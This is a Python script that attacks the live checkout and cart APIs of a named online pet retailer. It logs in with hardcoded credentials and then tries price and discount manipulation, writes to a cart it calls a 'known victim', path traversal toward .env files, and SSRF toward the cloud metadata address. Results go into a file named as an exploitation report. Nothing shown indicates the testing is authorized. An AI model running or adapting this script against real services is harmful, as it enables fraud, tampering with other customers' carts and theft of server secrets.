#!/usr/bin/env python3
"""Test State API for vulnerabilities"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

vulns = []

# Test State API endpoints
print("\n[*] Testing State API for vulnerabilities...")

state_base = "/semiprotected/api/checkout/state-api/v2"

# 1. Test set-article-quantity with malicious payloads
print("\n[1] Testing set-article-quantity with malicious payloads...")
endpoint = f"{state_base}/set-article-quantity"

malicious_payloads = [
    {"articleId": 2966422, "quantity": -999},  # Negative quantity
    {"articleId": 2966422, "quantity": 999999},  # Very large quantity
    {"articleId": 2966422, "quantity": 0},  # Zero quantity
    {"articleId": "2966422", "quantity": 2},  # String ID
    {"articleId": 2966422, "quantity": "2"},  # String quantity
    {"articleId": 2966422, "quantity": 2, "price": 0.01},  # Price manipulation
    {"articleId": 2966422, "quantity": 2, "discount": 100},  # Discount manipulation
]

for payload in malicious_payloads:
    try:
        resp = s.put(f"{base}{endpoint}", json=payload, timeout=3, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            print(f"  [OK] Payload accepted: {payload}")
            if isinstance(data, dict) and 'error' not in str(data).lower():
                vulns.append({"type": "business_logic", "endpoint": endpoint, "payload": payload, "severity": "HIGH"})
    except: pass

# 2. Test other state-api endpoints
print("\n[2] Testing other state-api endpoints...")
other_endpoints = [
    f"{state_base}/set-autoshipment",
    f"{state_base}/set-delivery-address",
    f"{state_base}/set-shipping",
    f"{state_base}/set-payment",
    f"{state_base}/set-coupon",
    f"{state_base}/update",
]

for ep in other_endpoints:
    # Try various payloads
    test_payloads = [
        {"test": "data"},
        {"id": 1},
        {"uuid": "test"},
        {"config": {"debug": True}},
    ]
    
    for payload in test_payloads:
        try:
            resp = s.post(f"{base}{ep}", json=payload, timeout=3, verify=False)
            if resp.status_code in [200, 201]:
                print(f"  [OK] {ep} -> {resp.status_code}")
                data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                if isinstance(data, dict) and data:
                    print(f"      Response: {list(data.keys())[:5]}")
        except: pass

# 3. Test cart-api POST/PUT endpoints
print("\n[3] Testing cart-api POST/PUT endpoints...")
cart_uuid = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"  # Known victim cart

cart_endpoints = [
    f"/checkout/api/cart-api/v2/cart/{cart_uuid}/articles",
    f"/checkout/api/cart-api/v2/cart/{cart_uuid}/add",
    f"/checkout/api/cart-api/v2/cart/{cart_uuid}/update",
    f"/checkout/api/cart-api/v2/cart/{cart_uuid}/coupon",
    f"/checkout/api/cart-api/v2/cart/{cart_uuid}/promo",
]

for ep in cart_endpoints:
    test_payloads = [
        {"articleId": 2966422, "quantity": 1},
        {"offerId": 2966422, "quantity": 1},
        {"code": "TEST"},
        {"promo": "TEST"},
    ]
    
    for payload in test_payloads:
        try:
            resp = s.post(f"{base}{ep}", json=payload, timeout=3, verify=False)
            if resp.status_code in [200, 201]:
                print(f"  [OK] POST {ep} -> {resp.status_code}")
                vulns.append({"type": "idor_write", "endpoint": ep, "payload": payload, "severity": "CRITICAL"})
        except: pass

# 4. Test path traversal in state-api
print("\n[4] Testing path traversal in state-api...")
traversal_paths = [
    f"{state_base}/../config",
    f"{state_base}/../../.env",
    f"{state_base}/get/../config",
]

for path in traversal_paths:
    try:
        resp = s.get(f"{base}{path}", timeout=3, verify=False)
        if resp.status_code == 200 and not resp.text.strip().startswith('<!'):
            if any(x in resp.text for x in ['config', 'SECRET', 'NODE_ENV']):
                print(f"  [CRITICAL] Path traversal: {path}")
                vulns.append({"type": "path_traversal", "endpoint": path, "severity": "CRITICAL"})
    except: pass

# 5. Test SSRF in state-api
print("\n[5] Testing SSRF in state-api...")
ssrf_payloads = [
    {"url": "http://169.254.169.254/latest/meta-data/"},
    {"endpoint": "http://127.0.0.1"},
    {"callback": "http://169.254.169.254"},
]

for payload in ssrf_payloads:
    try:
        resp = s.post(f"{base}{state_base}/get", json=payload, timeout=2, verify=False)
        if resp.status_code in [200, 400] and len(resp.text) > 50:
            if "metadata" in resp.text.lower() or "169.254" in resp.text:
                print(f"  [CRITICAL] SSRF: {payload}")
                vulns.append({"type": "ssrf", "endpoint": f"{state_base}/get", "payload": payload, "severity": "CRITICAL"})
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("VULNERABILITIES FOUND")
print("=" * 70)

if vulns:
    for v in vulns:
        print(f"\n[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a") as f:
        f.write(f"\n\n---\n\n## 🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().isoformat()}\n\n")
        for v in vulns:
            f.write(f"### [{v['severity']}] {v['type']}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{json.dumps(v['payload'])}`\n\n")
            f.write(f"**Status:** Подтверждено\n\n")
    
    print(f"\n[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No new vulnerabilities found")

print("=" * 70)

